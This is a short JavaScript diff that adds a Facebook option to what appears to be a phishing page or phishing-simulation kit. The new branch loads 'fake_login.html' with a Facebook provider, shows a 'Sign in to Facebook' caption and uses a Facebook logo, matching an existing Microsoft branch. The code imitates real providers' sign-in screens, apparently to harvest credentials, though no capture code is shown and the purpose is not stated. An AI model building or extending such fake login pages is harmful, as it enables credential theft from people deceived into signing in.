@@ -62,6 +62,10 @@ document.addEventListener('DOMContentLoaded', function() {
       content.src = 'fake_login.html?provider=microsoft';
       document.getElementById('logo-description').textContent = 'Sign in to Microsoft';
       logoElement.src = 'logo.svg';
+    } else if (provider === 'facebook') {
+      content.src = 'fake_login.html?provider=facebook';
+      document.getElementById('logo-description').textContent = 'Sign in to Facebook';
+      logoElement.src = 'facebook-logo.svg';
     }
   }
   
